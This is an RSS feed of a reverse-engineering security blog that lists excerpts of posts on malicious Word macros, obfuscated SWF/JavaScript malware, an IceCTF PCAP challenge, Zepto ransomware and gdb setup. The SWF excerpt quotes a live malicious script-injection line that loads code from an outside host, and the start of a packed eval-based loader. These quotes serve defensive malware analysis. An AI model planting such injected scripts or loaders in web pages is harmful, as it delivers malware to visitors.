<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Reverse Engineering on { bit.therapy }</title>
    <link>/tags/reverse-engineering/</link>
    <description>Recent content in Reverse Engineering on { bit.therapy }</description>
    <generator>Hugo -- gohugo.io</generator>
    <copyright>{ bit.therapy }</copyright>
    <lastBuildDate>Fri, 25 Nov 2016 18:09:21 +0000</lastBuildDate>
    
	<atom:link href="/tags/reverse-engineering/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Malicious Document Analysis â€“ Macro to Shellcode</title>
      <link>/post/malicious-document-analysis-macro-to-shellcode/</link>
      <pubDate>Fri, 25 Nov 2016 18:09:21 +0000</pubDate>
      
      <guid>/post/malicious-document-analysis-macro-to-shellcode/</guid>
      <description>I came across an interesting Word document which at first glance definitely looked malicious. It had everything from random variable names to lyrics from Garbage - Run Baby Run in the comments. It also used an uncommon but very cool method for moving from macro to machine code execution.
Macro Breakdown The macro starts by creating pointers to DLL exports already loaded in memory by Word:
&#39;Run from the noise of the street and the loaded gun Public Declare Function whitworth Lib &amp;quot;kernel32.</description>
    </item>
    
    <item>
      <title>Analyzing Obfuscated SWFs</title>
      <link>/post/analyzing-obfuscated-swfs/</link>
      <pubDate>Sun, 09 Oct 2016 13:18:17 +0000</pubDate>
      
      <guid>/post/analyzing-obfuscated-swfs/</guid>
      <description>A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
document.write(unescape(&amp;quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&amp;quot;));  Digging deeper:
eval(function(p,a,c,k,e,r){e=function(c){return(c&amp;lt;a?&#39;&#39;:e(parseInt(c/a)))+((c=c%a)&amp;gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w+&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&amp;quot;V&amp;quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&amp;quot;1u&amp;quot;);6.w.o=&amp;quot;0&amp;quot;;6.w.j=&amp;quot;0&amp;quot;;6.w.1G=&amp;quot;1M&amp;quot;;6.w.29=&amp;quot;-2d&amp;quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3.</description>
    </item>
    
    <item>
      <title>IceCTF: Analyzing PCAPs and Reversing Encryption</title>
      <link>/post/icectf-analyzing-pcaps-and-reversing-encryption/</link>
      <pubDate>Sat, 20 Aug 2016 17:49:03 +0000</pubDate>
      
      <guid>/post/icectf-analyzing-pcaps-and-reversing-encryption/</guid>
      <description>IceCTF started a little while a go and we got a team together to try and grab some of these flags. If you&amp;rsquo;re doing the challenges right now&amp;hellip; well spoiler alert.
One of the challenges provided a PCAP with a conversation between two parties that contained the flag somewhere.
##PCAP Analysis
Alright, let me open this in Wireshark:
Interesting&amp;hellip; some IRC chatter. If I right-click and Follow TCP stream I can read the full conversation:</description>
    </item>
    
    <item>
      <title>A Look at Zepto Ransomware - Payload Delivery Analysis</title>
      <link>/post/a-look-at-zepto-ransomware-payload-delivery-analysis/</link>
      <pubDate>Tue, 16 Aug 2016 12:36:51 +0000</pubDate>
      
      <guid>/post/a-look-at-zepto-ransomware-payload-delivery-analysis/</guid>
      <description>It&amp;rsquo;s another quiet Friday when we are alerted of bunch of files with the .zepto extension being created all over the place. It seems that a Zepto sample that worked its way through our network. AV was mostly useless and the ransomware managed to encrypt a few thousand files on a particular share.
First thing&amp;rsquo;s first, I need to find all the users actively encrypting files on this share.</description>
    </item>
    
    <item>
      <title>Making gdb More Useful For Reversing</title>
      <link>/post/making-gdb-useful-for-reversing/</link>
      <pubDate>Fri, 29 Jan 2016 20:23:07 +0000</pubDate>
      
      <guid>/post/making-gdb-useful-for-reversing/</guid>
      <description>Unless you&amp;rsquo;re using something like DDD or Gdbinit, gdb vanilla is pretty hard to work with when reversing binaries.
The following is a bunch of display commands that gdb will execute after every &amp;lsquo;step&amp;rsquo;; put them in a file called gdb.cmd somewhere in ~/:
# cat ~/gdb.cmd set disassembly-flavor intel display/10i $eip display/x $eax display/x $ebx display/x $ecx display/x $edx display/x $edi display/x $esi display/x $ebp display/16xw $esp break main  Now you can use the -x gdb commandline parameter and running a program with start or run will show the following:</description>
    </item>
    
  </channel>
</rss>